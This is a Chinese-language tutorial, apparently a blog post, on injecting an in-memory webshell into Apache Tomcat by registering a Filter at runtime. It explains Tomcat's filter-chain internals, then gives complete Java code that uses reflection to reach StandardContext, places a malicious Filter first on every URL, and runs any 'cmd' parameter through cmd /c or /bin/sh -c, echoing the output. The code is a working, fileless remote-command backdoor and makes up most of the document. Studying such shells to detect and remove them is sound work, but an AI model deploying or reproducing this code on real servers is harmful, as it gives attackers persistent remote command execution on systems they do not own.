### Servlet动态注册机制注入

Servlet、Listener、Filter 由 `javax.servlet.ServletContext` 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。

#### Filter类型

一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet

`ServletContext`类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 ServletContextListener.contextInitialized 方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 javax.servlet.annotation.WebListener 进行注释，则会抛出 UnsupportedOperationException 异常

在tomcat容器中对于`javax.servlet.ServletContext`的实现类是`org.apache.catalina.core.ApplicationContext`

`Tomcat`处理一个请求的对应的ServletChain:

`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`方法中

- 在 context 中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配；
- 如果匹配则在 context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig；
- 如果获取到 filterConfig，则将其加入到 filterChain 中
- 后续将会循环 filterChain 中的全部 filterConfig，通过 `getFilter` 方法获取 Filter 并执行 Filter 的 `doFilter` 方法。

如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。

在应用程序动态添加Filter

- 调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；
- 调用 StandardContext 的 filterStart 方法生成 filterConfigs；
- 调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；
- 为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位。

**实现流程**

根据上面流程我们只需要设置filterMaps、filterConfigs、filterDefs就可以注入恶意的filter

- filterMaps：一个HashMap对象，包含过滤器名字和URL映射
- filterDefs：一个HashMap对象，过滤器名字和过滤器实例的映射
- filterConfigs变量：一个ApplicationFilterConfig对象，里面存放了filterDefs

```java
package pres.test.momenshell;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;


import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.Scanner;

public class AddTomcatFilter extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            String name = "RoboTerh";
            //从request中获取ServletContext
            ServletContext servletContext = req.getSession().getServletContext();

            //从context中获取ApplicationContext对象
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            //从ApplicationContext中获取StandardContext对象
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            //从StandardContext中获得filterConfigs这个map对象
            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            //如果这个过滤器名字没有注册过
            if (filterConfigs.get(name) == null) {
                //自定义一个Filter对象
                Filter filter = new Filter() {
                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null) {
                            PrintWriter writer = resp.getWriter();
                            String cmd = req.getParameter("cmd");
                            String[] commands = new String[3];
                            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                                commands[0] = "cmd";
                                commands[1] = "/c";
                            } else {
                                commands[0] = "/bin/sh";
                                commands[1] = "-c";
                            }
                            commands[2] = cmd;
                            try {
                                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
                                writer.getClass().getDeclaredMethod("flush").invoke(writer);
                                writer.getClass().getDeclaredMethod("close").invoke(writer);
                                return;
                            } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                                e.printStackTrace();
                            }

                        }
                        filterChain.doFilter(servletRequest, servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }

                };

                //创建FilterDef对象 并添加 filter对象，filtername, filter类
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());
                //通过addFilterDef方法添加 filterDef 方法
                standardContext.addFilterDef(filterDef);

                //创建FilterMap对象，并添加 filter映射，filtername
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                //这个不要忘记了
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                //通过addFilterMapBefore方法添加filterMap对象
                standardContext.addFilterMapBefore(filterMap);

                //通过前面获取的filtermaps的put方法放入filterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(name, filterConfig);

                PrintWriter out = resp.getWriter();
                out.print("Inject Success !");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

